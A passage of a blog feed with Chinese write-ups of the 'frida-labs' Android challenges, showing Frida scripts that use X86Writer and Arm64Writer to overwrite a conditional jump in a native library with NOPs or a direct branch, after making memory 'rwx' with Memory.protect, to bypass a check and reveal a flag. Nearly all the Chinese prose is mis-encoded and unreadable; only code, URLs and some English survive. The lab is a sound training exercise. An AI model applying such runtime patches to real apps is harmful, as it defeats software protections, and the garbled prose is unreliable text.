‡å¿—ã€‚</p><p>å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™äº›æ±‡ç¼–æŒ‡ä»¤ï¼Œé‚£è®©ifè¯­å¥ä¸è·³è½¬ï¼Œé‚£ä¸å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œä»£ç äº†å—ã€‚</p><p>ä¸ºäº†ä¿®æ”¹&#x2F;ä¸´æ—¶ä¿®è¡¥æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ x86 æ¶æ„çš„ <code>X86Writer</code> ç±»å’Œ ARM64 æ¶æ„çš„ <code>Arm64Writer</code> ç±»ã€‚</p><p>å½“æˆ‘ä½¿ç”¨ <code>x86</code> æ—¶ï¼Œæˆ‘å°†ä½¿ç”¨ <code>X86Writer</code> ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªåŸºæœ¬æ¨¡æ¿ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(&lt;address_of_the_instruction&gt;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">// Insert instructions</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Flush the changes to memory</span></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="comment">// Dispose of the X86Writer to free up resources</span></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>**X86Writer**</code> <strong>çš„å®ä¾‹åŒ–ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var writer = new X86Writer(&lt;address_of_the_instruction&gt;);</span><br></pre></td></tr></table></figure><ul><li>è¿™å°†åˆ›å»º <code>X86Writer</code> ç±»çš„å®ä¾‹å¹¶æŒ‡å®šæˆ‘ä»¬è¦ä¿®æ”¹çš„æŒ‡ä»¤çš„åœ°å€ã€‚è¿™å°†è®¾ç½®å†™å…¥å™¨åœ¨æŒ‡å®šçš„å†…å­˜ä½ç½®ä¸Šè¿›è¡Œæ“ä½œã€‚</li></ul><p><strong>Inserting instructions: æ’å…¥è¯´æ˜ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123; /* Insert instructions here */ &#125;</span><br></pre></td></tr></table></figure><ul><li>åœ¨ <code>try</code> å—ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥è¦ä¿®æ”¹&#x2F;æ·»åŠ çš„ x86 æŒ‡ä»¤ã€‚ <code>X86Writer</code> å®ä¾‹æä¾›äº†æ’å…¥å„ç§x86æŒ‡ä»¤çš„å„ç§æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥ä¸ºæ­¤ä½¿ç”¨æ–‡æ¡£ã€‚</li></ul><p><strong>Flushing the Changes : åˆ·æ–°æ›´æ”¹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">writer.flush();</span><br></pre></td></tr></table></figure><ul><li>æ’å…¥æŒ‡ä»¤åï¼Œè°ƒç”¨ <code>flush</code> æ–¹æ³•å°†æ›´æ”¹åº”ç”¨åˆ°å†…å­˜ã€‚è¿™å¯ç¡®ä¿å°†ä¿®æ”¹åçš„æŒ‡ä»¤å†™å…¥å†…å­˜ä½ç½®ã€‚</li></ul><p><strong>Cleanup : æ¸…ç† ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">finally &#123; /* Dispose of the X86Writer to free up resources */ writer.dispose(); &#125;</span><br></pre></td></tr></table></figure><ul><li><code>finally</code> å—ç”¨äºç¡®ä¿æ­£ç¡®æ¸…ç† <code>X86Writer</code> èµ„æºã€‚è°ƒç”¨ <code>dispose</code> æ–¹æ³•æ¥é‡Šæ”¾ä¸ <code>X86Writer</code> å®ä¾‹å…³è”çš„èµ„æºã€‚</li></ul><p>ç°åœ¨æˆ‘ä»¬å¯¹æ¨¡æ¿æœ‰äº†ä¸€ä¸ªå¤§æ¦‚çš„äº†è§£ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¿…é¡»æ‰¾å‡ºè¦ä¿®è¡¥&#x2F;ä¿®æ”¹çš„æŒ‡ä»¤ã€‚è¿™éœ€è¦ä¸€äº›é€†å‘å·¥ç¨‹åŸºç¡€çŸ¥è¯†ã€‚è¯·è€ƒè™‘ä»¥ä¸‹ä¸‰ä¸ªè¯´æ˜ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281907958.png" alt="image.png"> </p><p>é¦–å…ˆï¼Œå®ƒå°† <code>0xdeadbeef</code> åŠ è½½åˆ° <code>local_14</code> ä¸­ï¼Œç„¶åå°†å…¶ä¸ <code>0x539</code> è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœä¸¤ä¸ªæ“ä½œæ•°ç›¸åŒï¼Œ <code>CMP</code> æŒ‡ä»¤å°†è®¾ç½®é›¶æ ‡å¿—ã€‚åœ¨è¿™ä¸ª <code>CMP</code> æŒ‡ä»¤ä¹‹åï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª <code>JNZ</code> æŒ‡ä»¤ã€‚å¦‚æœé›¶æ ‡å¿—æœªè®¾ç½®ï¼Œè¯¥æŒ‡ä»¤ï¼ˆè·³è½¬éé›¶ï¼‰ä¼šå°†æ‰§è¡Œæµç¨‹æ›´æ”¹ä¸ºæŒ‡å®šåœ°å€ã€‚å¦‚æœè®¾ç½®äº†é›¶æ ‡å¿—ï¼Œåˆ™ä¸ä¼šè·³è½¬å¹¶ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ä½†ä¸å¹¸çš„æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”±äº <code>0xdeadbeef</code> ä¸ç­‰äº <code>0x539</code> ï¼Œå› æ­¤ä¸ä¼šè®¾ç½®é›¶æ ‡å¿—ï¼Œå¹¶ä¸” <code>JNZ</code> æŒ‡ä»¤å°†è·³è½¬åˆ°åœ°å€ &lt; b9&gt; è¿™æ˜¯å‡½æ•°çš„ç»“å°¾ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281906911.png" alt="img"> </p><p>æˆ‘ä»¬å¸Œæœ›åº”ç”¨ç¨‹åºä¸è¿›è¡Œè·³è½¬ï¼Œä»¥ä¾¿ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€è§£ç å¹¶è®°å½•æˆ‘ä»¬çš„æ ‡å¿—ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ä¿®è¡¥ <code>JNZ</code> æŒ‡ä»¤ï¼Œä½¿å…¶ä¸è¿›è¡Œè·³è½¬ã€‚æˆ‘ä»¬å¯ä»¥å°† <code>JNZ</code> æ›¿æ¢ä¸º <code>NOP</code> æŒ‡ä»¤ã€‚ <code>NOP</code> ä»£è¡¨æ— æ“ä½œã€‚é™¤äº†å°†æ‰§è¡Œä¼ é€’ç»™ä¸‹ä¸€æ¡æŒ‡ä»¤ä¹‹å¤–ï¼Œå®ƒä¸æ‰§è¡Œä»»ä½•å…¶ä»–æ“ä½œã€‚é€šè¿‡æ›¿æ¢ <code>NOP</code> ä»£æ›¿ <code>JNZ</code> ï¼Œæ‰§è¡Œå°†ç»§ç»­è€Œä¸è·³è½¬ï¼Œå¹¶è®°å½•æ ‡å¿—ã€‚æ‚¨è¿˜å¯ä»¥å°è¯•å…¶ä»–æŒ‡ä»¤ï¼Œä¾‹å¦‚ <code>JE</code> ï¼Œå®ƒä¸ <code>JNZ</code> ç›¸åã€‚</p><h2 id="ä½¿ç”¨-X86Writer-ä¿®è¡¥"><a href="#ä½¿ç”¨-X86Writer-ä¿®è¡¥" class="headerlink" title="ä½¿ç”¨ X86Writer ä¿®è¡¥"></a>ä½¿ç”¨ X86Writer ä¿®è¡¥</h2><p>é¦–å…ˆæ‰¾åˆ°æˆ‘ä»¬æƒ³è¦ä¿®è¡¥çš„ <code>JNZ</code> æŒ‡ä»¤çš„åœ°å€ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281907864.png" alt="image.png"> </p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç”¨åŸºæ•° <code>0x00010000</code> å‡å» <code>0x20e2a</code> æ¥æ‰¾åˆ°åç§»é‡ã€‚ç°åœ¨è¦è·å–å®é™…çš„å‡½æ•°åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å°†æ­¤åç§»é‡ä¸åŸºåœ°å€ç›¸åŠ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.ad2001.frida0xb ]-&gt; Module.getBaseAddress(&quot;libfrida0xb.so&quot;)</span><br><span class="line">&quot;0xc2083000&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.ad2001.frida0xb ]-&gt; Module.getBaseAddress(&quot;libfrida0xb.so&quot;).add(0x20e2a - 0x00010000)</span><br><span class="line">&quot;0xc2093e2a&quot;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jnz = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x20e2a</span> - <span class="number">0x00010000</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(jnz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬éœ€è¦å°† <code>NOP</code> æŒ‡ä»¤æ”¾ç½®åœ¨ <code>JNZ</code> æŒ‡ä»¤çš„ä½ç½®ã€‚è¦æ”¾ç½® <code>NOP</code> æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–¹æ³• <code>PutNop()</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908769.png" alt="image.png"> </p><p>å¯ä»¥å‚è€ƒæ–‡æ¡£ï¼š<a href="https://frida.re/docs/javascript-api/#x86writer">https://frida.re/docs/javascript-api/#x86writer</a></p><p>åœ¨æ›´æ–°è„šæœ¬ä¹‹å‰ï¼Œè¯·è€ƒè™‘ä¸€ä¸‹è¿™ä¸€ç‚¹ã€‚è¿™é‡Œåº”è¯¥æ”¾ç½®å¤šå°‘ä¸ª <code>NOP</code> æŒ‡ä»¤ï¼Ÿ</p><p>å…¸å‹ <code>x86</code> æ¶æ„ä¸­ <code>NOP</code> æŒ‡ä»¤çš„å¤§å°ä¸º1å­—èŠ‚ã€‚ä½†æ˜¯çœ‹çœ‹æˆ‘ä»¬è¯•å›¾æ›¿æ¢çš„ <code>JNZ</code> æŒ‡ä»¤çš„å¤§å°ï¼Œå®ƒæ˜¯6ä¸ªå­—èŠ‚ã€‚</p><p>ä» <code>0x00020e30</code> ä¸­å‡å» <code>0x00020e2a</code> å¾—åˆ° 6ã€‚æ€»ä¹‹ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ <code>JNZ</code> çš„ä½ç½®æ”¾ç½® 6 ä¸ª <code>NOP</code> æŒ‡ä»¤ï¼Œå› ä¸ºåœ¨ä¿®è¡¥æ—¶æŒ‡ä»¤ä¸å…¶ä»–æŒ‡ä»¤çš„æ¯”è¾ƒï¼Œå¿…é¡»ä¿è¯æ–°æŒ‡ä»¤çš„å¤§å°å è¢«æ›¿æ¢æŒ‡ä»¤çš„å¤§å°ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥æ›´æ–°ä¸€ä¸‹è„šæœ¬å§ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jnz = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x20e2a</span> - <span class="number">0x00010000</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(jnz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908482.png" alt="image.png"> </p><p>ç¨‹åºå´©æºƒäº†ã€‚è¯¥é”™è¯¯è¡¨æ˜è¿›ç¨‹ç”±äºä¿æŠ¤å¤±è´¥è€Œå´©æºƒã€‚å‘ç”Ÿæ­¤å´©æºƒçš„åŸå› æ˜¯ï¼Œæˆ‘ä»¬å°è¯•å†™å…¥æ²¡æœ‰å†™å…¥æƒé™çš„å†…å­˜ã€‚æˆ‘ä»¬æ­£åœ¨å°è¯•å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶çš„ <code>.text</code> éƒ¨åˆ†ã€‚é»˜è®¤æƒ…å†µä¸‹å®ƒæ²¡æœ‰ <code>write</code> æƒé™ã€‚è¿™å°±æ˜¯å®ƒå´©æºƒçš„åŸå› ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ghidra çš„å†…å­˜æ˜ å°„å·¥å…·æ¥æ£€æŸ¥è¿™ä¸€ç‚¹ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908022.png" alt="image.png"> </p><p>é‚£è¿™ç§é—®é¢˜æ€ä¹ˆè§£å†³å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>è¿™é‡Œä½¿ç”¨ <code>Memory.protect</code> å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥ä¿®æ”¹å†…å­˜åŒºåŸŸçš„ä¿æŠ¤å±æ€§ã€‚ <code>Memory.protect</code> å‡½æ•°çš„è¯­æ³•æ˜¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(address, size, protection);</span><br></pre></td></tr></table></figure><p><code>address</code> ï¼šè¦æ›´æ”¹ä¿æŠ¤çš„å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€ã€‚</p><p><code>size</code> ï¼šå†…å­˜åŒºåŸŸçš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</p><p><code>protection</code> ï¼šå†…å­˜åŒºåŸŸçš„ä¿æŠ¤å±æ€§ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­¤å‡½æ•°ä½¿ <code>.text</code> éƒ¨åˆ†å¯å†™ã€‚æˆ‘ä»¬ä¸ä¼šä½¿æ•´ä¸ªéƒ¨åˆ†éƒ½å¯å†™ã€‚æˆ‘ä»¬åªéœ€è¦æ›´æ”¹ä¸€ä¸ªå°åŒºåŸŸçš„æƒé™ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ’å…¥ <code>NOP</code> æŒ‡ä»¤è€Œä¸ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºå´©æºƒã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æä¾› <code>JNZ</code> å‡½æ•°çš„åœ°å€ä½œä¸º <code>Memory.protect()</code> å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚å¯¹äºå¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®š <code>0x1000</code> ï¼Œè¿™å·²ç»è¶³å¤Ÿäº†ï¼Œå› ä¸ºæˆ‘ä»¬çš„ <code>NOP</code> æŒ‡ä»¤åªéœ€è¦ 6 ä¸ªå­—èŠ‚ã€‚ä¸ºäº†ä¿æŠ¤ï¼Œæˆ‘ä»¬éœ€è¦è¯»ã€å†™å’Œæ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ é€’ <code>rwx</code> ã€‚</p><p>æœ€åè„šæœ¬æ›´æ–°ä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jnz = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x20e2a</span> - <span class="number">0x00010000</span>);</span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(jnz, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title function_">X86Writer</span>(jnz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line">  writer.<span class="title function_">putNop</span>()</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908263.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281908243.png" alt="img"> </p><h2 id="ä½¿ç”¨Arm64Writerä¿®è¡¥"><a href="#ä½¿ç”¨Arm64Writerä¿®è¡¥" class="headerlink" title="ä½¿ç”¨Arm64Writerä¿®è¡¥"></a>ä½¿ç”¨Arm64Writerä¿®è¡¥</h2><p>è®©æˆ‘ä»¬åœ¨ ARM64 è®¾å¤‡ä¸Šå°è¯•ä¸€ä¸‹åŒæ ·çš„äº‹æƒ…ã€‚å¯¹äº ARM64ï¼Œæˆ‘ä»¬å¿…é¡»ä½¿ç”¨ ARM64 ç¼–å†™å™¨ã€‚</p><p>è®©æˆ‘ä»¬åç¼–è¯‘è¯¥åº”ç”¨ç¨‹åºä»¥è·å¾— ARM64 çš„ <code>libfrida0xb.so</code> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909835.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909819.png" alt="img"> </p><p>åœ¨ x86 ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº† <code>cmp</code> æŒ‡ä»¤ï¼Œä½†åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°äº† <code>subs</code> æŒ‡ä»¤ã€‚å®ƒä» 0xdeadbeef ä¸­å‡å» <code>0x539</code> ï¼›å¦‚æœç»“æœä¸ºé›¶ï¼Œåˆ™è®¾ç½®é›¶æ ‡å¿—ã€‚å¦‚æœæœªè®¾ç½®é›¶æ ‡å¿—ï¼Œåˆ™ <code>b.ne LAB_0011532c</code> ï¼ˆä¸ç­‰äºåˆ™è½¬ç§»ï¼‰æŒ‡ä»¤å°†è·³è½¬åˆ°ä½ç½® <code>LAB_0011532c</code> ã€‚å¦åˆ™ï¼Œä¸ä¼šè·³è½¬ï¼Œå¹¶æ‰§è¡Œ <code>b.ne LAB_0011532c</code> ä¹‹åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚æˆ‘ä»¬ä¸å¸Œæœ›å®ƒè·³è·ƒã€‚å› æ­¤ï¼Œä¸æˆ‘ä»¬ä¸Šé¢æ‰€åšçš„ç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®è¡¥ <code>b.ne</code> æŒ‡ä»¤ã€‚è®©æˆ‘ä»¬å°è¯•ä¸€äº›ä¸åŒçš„ä¸œè¥¿ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ <code>nop</code> æŒ‡ä»¤ã€‚</p><p>è®©æˆ‘ä»¬ç”¨ <code>b</code> æŒ‡ä»¤æ›¿æ¢ <code>b.ne</code> ã€‚æ— è®ºæ ‡å¿—å¦‚ä½•ï¼Œè¿™éƒ½å°†åˆ†æ”¯åˆ°æŒ‡å®šçš„æ ‡ç­¾æˆ–ä½ç½®ã€‚æˆ‘ä»¬å¯ä»¥å°† <code>b.ne</code> æŒ‡ä»¤æ›¿æ¢ä¸ºç›´æ¥åˆ†æ”¯åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åˆ†æ”¯æŒ‡ä»¤ã€‚</p><p>è®©æˆ‘ä»¬ä½¿ç”¨æ–‡æ¡£æ¥çœ‹çœ‹å“ªä¸ªæ–¹æ³•æä¾›äº†æ­¤æŒ‡ä»¤ã€‚</p><p><a href="https://frida.re/docs/javascript-api/#arm64writer">https://frida.re/docs/javascript-api/#arm64writer</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909797.png" alt="img"> </p><p>ç°åœ¨æˆ‘ä»¬éœ€è¦é‡å¤ä¸Šé¢çš„è¿‡ç¨‹æ¥æ‰¾åˆ° <code>b.ne</code> æŒ‡ä»¤çš„åœ°å€ä»¥åŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥å°†è¯¥åœ°å€ä¼ é€’ç»™ <code>putBImm(address)</code> å‡½æ•°ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ ghidra æ¥æŸ¥æ‰¾åç§»é‡ã€‚æˆ‘ä¸ä¼šå†è§£é‡Šäº†ã€‚</p><p>æ‰€ä»¥å¾—åˆ°åç§»é‡åï¼Œå¯ä»¥é€šè¿‡ <code>Module.findBaseAddress(&quot;libfrida0xb.so&quot;)</code> æ‰¾åˆ°åŸºå€ï¼ŒåŠ ä¸Šåç§»é‡ï¼Œå°±å¾—åˆ°äº†æŒ‡ä»¤çš„å®é™…åœ°å€ã€‚è®©æˆ‘ä»¬ç¼–å†™æœ€ç»ˆçš„è„šæœ¬ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> adr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x15248</span>);  <span class="comment">// Addres of the b.ne instruction</span></span><br><span class="line"><span class="title class_">Memory</span>.<span class="title function_">protect</span>(adr, <span class="number">0x1000</span>, <span class="string">&quot;rwx&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="title class_">Arm64Writer</span>(adr);  <span class="comment">// ARM64 writer object</span></span><br><span class="line"><span class="keyword">var</span> target = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1524c</span>);  <span class="comment">// Address of the next instruction  b  LAB_00115250</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">putBImm</span>(target);   <span class="comment">// Inserts the &lt;b target&gt; instruction in the place of b.ne instruction</span></span><br><span class="line">  writer.<span class="title function_">flush</span>();</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Branch instruction inserted at <span class="subst">$&#123;adr&#125;</span>`</span>);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">  writer.<span class="title function_">dispose</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ ARM64 ä¸­ï¼Œæ‚¨ä¸å¿…æ‹…å¿ƒæŒ‡ä»¤çš„å¯¹é½æ–¹å¼ï¼Œå› ä¸ºæ‰€æœ‰æŒ‡ä»¤éƒ½æ˜¯ 4 å­—èŠ‚å¯¹é½çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909917.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281909169.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida-labs(2)</title>
      <link href="/2024/07/27/frida-labs(2)/"/>
      <url>/2024/07/27/frida-labs(2)/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="challenge-0x08"><a href="#challenge-0x08" class="headerlink" title="challenge 0x08"></a>challenge 0x08</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281144561.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281144245.png" alt="image.png"> </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.ad2001.frida0x8.MainActivity.1</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edt.getText().toString();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.cmpstr(ip);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">1</span>) &#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;YEY YOU GOT THE FLAG &quot;</span> + ip, <span class="number">1</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;TRY AGAIN&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆ<code>onClick</code>å‡½æ•°ï¼Œå°†ç”¨æˆ·è¾“å…¥ä½œä¸ºå‚æ•°ï¼Œä¼ å…¥äº†<code>cmpstr</code> æ–¹æ³•ä¸­ï¼Œå¹¶è¿”å›äº†ä¸€ä¸ªæ•´æ•°å€¼</li><li>å¦‚æœè¿”å›å€¼ä¸º1ï¼Œåˆ™è¾“å‡ºç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬å†…å®¹ï¼Œå¦åˆ™è¿”å› â€œTRY AGAINâ€</li></ul><p><code>cmpstr</code> æ–¹æ³•ä¸º<code>native</code>ä¸­å®šä¹‰çš„ï¼Œå‡½æ•°æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°å¹¶è¿”å›ä¸€ä¸ªæ•´æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281147466.png" alt="image.png"> </p><p>ç›´æ¥è§£å‹apkæ–‡ä»¶,æˆ–ä½¿ç”¨apktoolç­‰åç¼–è¯‘å·¥å…·ï¼Œåœ¨&#x2F;resources&#x2F;lib&#x2F;ç›®å½•ä¸‹å­˜æ”¾äº†å¯¹åº”çš„.soæ–‡ä»¶</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281148523.png" alt="image.png"> </p><p>å¤§å¤šæ•°ç‰©ç†è®¾å¤‡éƒ½åŸºäº ARM64 æ¶æ„ï¼Œè¿™å—ä½¿ç”¨æ¨¡æ‹Ÿå™¨æ‰“å¼€apkï¼Œæ‰€ä»¥ä½¿ç”¨ <code>x86</code> åº“ã€‚ä½†ä¸ä¼šæœ‰å¤ªå¤§åŒºåˆ«ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281148984.png" alt="image.png"> </p><p>å¯ä»¥ä½¿ç”¨IDAç­‰é€†å‘æ±‡ç¼–å·¥å…·æ‰“å¼€soæ–‡ä»¶ï¼Œè¿™å—ä½¿ç”¨ä¸€ä¸ªæ–°å·¥å…·ï¼šGhidra</p><p>å…·ä½“ä½¿ç”¨æ•™ç¨‹å¯å‚è€ƒï¼š<a 